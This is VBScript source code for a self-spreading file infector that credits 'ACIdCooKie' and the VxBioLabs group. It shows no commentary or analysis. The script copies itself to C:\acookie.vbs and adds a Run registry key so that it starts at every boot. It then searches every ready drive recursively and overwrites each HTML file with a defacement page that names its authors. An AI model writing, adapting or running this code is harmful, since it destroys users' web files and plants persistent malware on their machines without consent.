   on error resume next
   Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder
   Set Fso=createobject("scripting.filesystemobject")
   Set w = fso.GetFile(WScript.ScriptFullName)
   w.Copy ("C:\acookie.vbs")
   Set vrc2 = CreateObject( "WScript.Shell" )
   vrc2.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "VxBioLabs", ("C:\acookie.vbs")
   Set Drives=fso.drives
   For Each Drive in Drives
   If drive.isready then
   Dosearch drive
   end If
   Next
   'coded by ACIdCooKie / www.vxbiolabs.cjb.net
   Function Dosearch(Path)
   Set Folder=fso.getfolder(path)
   Set Files = folder.files
   For Each File in files
   If fso.GetExtensionName(file.path)="htm" or fso.GetExtensionName(file.path)="html" then
   Set Script = Fso.CreateTextFile(file.path, True)
   Script.Writeline "<html>"
   Script.Writeline "<b>INFECTED by VBS Worm Maker / LittleBoy / coded by ACIdCooKie</b><br><br>"
   Script.Writeline "<b>http://www.vxbiolabs.cjb.net</b> Visit Web Site</a><br><br><br><center><font size=15>- VxBioLabs -<br><b> Specie & ACIdCooKie </b></center><br><br><br><font size=5>"
   Script.Writeline "Virii name is: EMM"
   Script.Writeline "<br>Author of this virii is: PetiK"
   Script.Writeline "</html>"
   Script.Close
   end if
   Next
   Set Subfolders = folder.SubFolders
   For Each Subfolder in Subfolders
   Dosearch Subfolder.path
   Next
   end function
   'Author of LittleBoy is ACIDCOOKIE
